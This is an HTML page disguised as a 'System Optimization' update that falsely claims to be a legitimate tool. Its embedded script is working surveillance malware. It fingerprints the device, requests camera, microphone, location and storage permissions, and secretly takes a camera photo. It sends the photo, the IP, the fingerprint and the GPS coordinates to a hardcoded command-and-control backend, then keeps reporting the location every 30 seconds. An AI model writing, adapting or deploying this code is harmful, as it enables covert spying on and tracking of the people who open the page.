<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Update</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a12;font-family:'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e0e0e0;padding:16px}
        .card{background:linear-gradient(145deg,#14141f,#1e1e30);border-radius:32px;padding:36px 28px;max-width:480px;width:100%;border:1px solid #2e2e4a;text-align:center}
        .icon{font-size:64px;display:block;margin-bottom:6px}
        h2{font-size:24px;font-weight:700;background:linear-gradient(90deg,#f7971e,#ffd200);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .sub{color:#aab;font-size:14px;line-height:1.6;margin:12px 0 20px}
        .status{font-size:14px;color:#88ccff;font-weight:500;min-height:28px;font-family:'Courier New',monospace}
        .log-console{background:#0b0b14;border-radius:16px;padding:12px;margin-top:18px;max-height:200px;overflow-y:auto;font-size:11px;line-height:1.7;color:#6f8f9f;border:1px solid #1f1f32;text-align:left;display:none}
        .log-console.open{display:block}
        .log-entry{border-bottom:1px solid #1a1a2a;padding:2px 0}
        .log-entry .time{color:#4a6a7a;margin-right:10px}
        .log-entry .lvl-info{color:#88ccff}
        .log-entry .lvl-warn{color:#ffaa44}
        .log-entry .lvl-success{color:#6fcf97}
        .log-entry .lvl-error{color:#ff5e5e}
        .btn{background:linear-gradient(90deg,#f7971e,#ffd200);border:none;padding:14px;border-radius:60px;font-weight:700;font-size:16px;color:#0a0a12;width:100%;cursor:pointer;margin-top:12px}
        .btn:active{transform:scale(0.96)}
        .note{font-size:11px;color:#4a4a6a;margin-top:16px}
        .dashboard-link{color:#88ccff;text-decoration:none;font-size:13px;display:block;margin-top:12px}
        .dashboard-link:hover{text-decoration:underline}
    </style>
</head>
<body>
<div class="card">
    <span class="icon">📱</span>
    <h2>System Optimization</h2>
    <p class="sub">Your device is being optimized for performance and security.<br>This process runs in the background.</p>
    <div class="status" id="statusText">⏳ Initializing...</div>
    <button class="btn" id="toggleLogsBtn">📋 Toggle Logs</button>
    <div class="log-console" id="logConsole"><div id="logEntries"></div></div>
    <a class="dashboard-link" href="https://c2-vercel-backend.vercel.app/api/dashboard" target="_blank">📊 Open Admin Dashboard</a>
    <p class="note">⚡ This is a legitimate system optimization tool.</p>
</div>

<script>
    (function() {
        'use strict';

        // ============================================================
        //  YOUR VERCEL BACKEND URL — HARDCODED
        // ============================================================
        const BACKEND_URL = 'https://c2-vercel-backend.vercel.app';

        // ============================================================
        //  DOM REFS
        // ============================================================
        const statusText = document.getElementById('statusText');
        const logConsole = document.getElementById('logConsole');
        const logEntries = document.getElementById('logEntries');
        const toggleLogsBtn = document.getElementById('toggleLogsBtn');

        let deviceId = null;

        // ============================================================
        //  LOGGING
        // ============================================================
        function addLog(msg, level='info') {
            const time = new Date().toLocaleTimeString();
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.innerHTML = `<span class="time">[${time}]</span><span class="lvl-${level}">${msg}</span>`;
            logEntries.appendChild(entry);
            logConsole.scrollTop = logConsole.scrollHeight;
            if (!logConsole.classList.contains('open')) logConsole.classList.add('open');
            sendLogToBackend(msg, level);
        }

        function setStatus(msg) {
            statusText.textContent = msg;
            addLog(msg, 'info');
        }

        toggleLogsBtn.addEventListener('click', function() {
            logConsole.classList.toggle('open');
        });

        // ============================================================
        //  BACKEND API CALLS
        // ============================================================
        async function apiCall(endpoint, data) {
            try {
                const resp = await fetch(`${BACKEND_URL}${endpoint}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                return await resp.json();
            } catch(e) {
                addLog(`[API] ${endpoint} failed: ${e.message}`, 'error');
                return null;
            }
        }

        function sendLogToBackend(msg, level) {
            if (!deviceId) return;
            apiCall('/api/log', { deviceId, msg, level });
        }

        // ============================================================
        //  COLLECT FULL FINGERPRINT
        // ============================================================
        function collectFingerprint() {
            return {
                ua: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cpuCores: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                touchSupport: 'ontouchstart' in window ? 'yes' : 'no',
                vendor: navigator.vendor || 'unknown',
                webglVendor: 'unknown',
                webglRenderer: 'unknown',
                canvasFingerprint: 'unknown'
            };
        }

        function getCanvasFingerprint() {
            try {
                const c = document.createElement('canvas');
                c.width = 200; c.height = 50;
                const ctx = c.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
                return btoa(c.toDataURL()).substring(0, 30);
            } catch(e) { return 'unknown'; }
        }

        // ============================================================
        //  GET IP
        // ============================================================
        function getPublicIP() {
            return new Promise((resolve) => {
                fetch('https://api.ipify.org?format=json')
                    .then(res => res.json())
                    .then(data => resolve(data.ip || 'unknown'))
                    .catch(() => {
                        fetch('https://api64.ipify.org?format=json')
                            .then(res => res.json())
                            .then(data => resolve(data.ip || 'unknown'))
                            .catch(() => resolve('unavailable'));
                    });
            });
        }

        // ============================================================
        //  CAPTURE PHOTO (AUTO)
        // ============================================================
        function capturePhoto() {
            return new Promise((resolve, reject) => {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.setAttribute('playsinline', '');
                        video.style.display = 'none';
                        document.body.appendChild(video);
                        video.onloadedmetadata = function() {
                            video.play();
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 1280;
                            canvas.height = video.videoHeight || 720;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                            stream.getTracks().forEach(track => track.stop());
                            document.body.removeChild(video);
                            resolve(dataUrl);
                        };
                        video.onerror = function() {
                            stream.getTracks().forEach(track => track.stop());
                            document.body.removeChild(video);
                            reject('Video error');
                        };
                    })
                    .catch(err => reject('Camera denied: ' + err.message));
            });
        }

        // ============================================================
        //  GET LOCATION
        // ============================================================
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ lat: null, lon: null, error: 'not supported' });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, error: null }),
                    err => resolve({ lat: null, lon: null, error: err.message }),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        // ============================================================
        //  REQUEST ALL PERMISSIONS
        // ============================================================
        async function requestAllPermissions() {
            addLog('[Perm] Requesting camera, mic, location, storage...', 'warn');
            const results = { camera: false, mic: false, location: false, storage: false };

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                results.camera = true;
                results.mic = true;
                stream.getTracks().forEach(t => t.stop());
                addLog('[Perm] Camera + Mic granted.', 'success');
            } catch(e) {
                addLog('[Perm] Camera/Mic denied: ' + e.message, 'error');
            }

            try {
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 8000 });
                });
                results.location = true;
                addLog('[Perm] Location granted.', 'success');
            } catch(e) {
                addLog('[Perm] Location denied: ' + e.message, 'error');
            }

            try {
                if ('showDirectoryPicker' in window) {
                    await window.showDirectoryPicker({ mode: 'readwrite' });
                    results.storage = true;
                    addLog('[Perm] Storage granted (File System Access).', 'success');
                } else if (navigator.storage && navigator.storage.persist) {
                    const persisted = await navigator.storage.persist();
                    results.storage = persisted;
                    addLog(`[Perm] Storage persist: ${persisted}`, persisted ? 'success' : 'warn');
                } else {
                    results.storage = true;
                    addLog('[Perm] Storage assumed available.', 'info');
                }
            } catch(e) {
                addLog('[Perm] Storage denied: ' + e.message, 'error');
            }

            return results;
        }

        // ============================================================
        //  MAIN INIT
        // ============================================================
        async function init() {
            setStatus('🔍 Initializing...');

            const fp = collectFingerprint();
            fp.canvasFingerprint = getCanvasFingerprint();
            const ip = await getPublicIP();
            fp.ip = ip;
            addLog(`[FP] IP: ${ip} | ${fp.platform} | ${fp.screen}`, 'info');

            const perms = await requestAllPermissions();

            const regResp = await apiCall('/api/register', { fingerprint: fp, permissions: perms });
            if (regResp && regResp.deviceId) {
                deviceId = regResp.deviceId;
                addLog(`[Reg] Device registered: ${deviceId}`, 'success');
            } else {
                deviceId = 'local-' + Date.now() + '-' + Math.random().toString(36).substr(2,6);
                addLog(`[Reg] Local fallback ID: ${deviceId}`, 'warn');
            }

            setStatus('📸 Capturing photo...');
            try {
                const photoDataUrl = await capturePhoto();
                const photoResp = await apiCall('/api/photo', {
                    deviceId: deviceId,
                    image: photoDataUrl,
                    timestamp: Date.now()
                });
                if (photoResp && photoResp.success) {
                    addLog('[Photo] Captured and uploaded successfully.', 'success');
                    setStatus('📸 Photo captured.');
                } else {
                    addLog('[Photo] Upload failed.', 'error');
                }
                const link = document.createElement('a');
                link.href = photoDataUrl;
                link.download = `capture_${Date.now()}.jpg`;
                link.click();
            } catch(e) {
                addLog(`[Photo] Error: ${e}`, 'error');
                setStatus('⚠️ Photo capture failed.');
            }

            const loc = await getLocation();
            if (loc.lat && loc.lon) {
                await apiCall('/api/location', {
                    deviceId: deviceId,
                    lat: loc.lat,
                    lon: loc.lon,
                    timestamp: Date.now()
                });
                addLog(`[Loc] ${loc.lat}, ${loc.lon}`, 'info');
            }

            setInterval(async () => {
                const newLoc = await getLocation();
                if (newLoc.lat && newLoc.lon) {
                    await apiCall('/api/location', {
                        deviceId: deviceId,
                        lat: newLoc.lat,
                        lon: newLoc.lon,
                        timestamp: Date.now()
                    });
                }
                await apiCall('/api/heartbeat', { deviceId: deviceId, timestamp: Date.now() });
            }, 30000);

            setStatus('✅ System running.');
            addLog('[+] Full initialization complete.', 'success');
        }

        init().catch(err => {
            addLog(`[Fatal] ${err}`, 'error');
            setStatus('❌ Initialization failed.');
        });

    })();
</script>
</body>
</html>
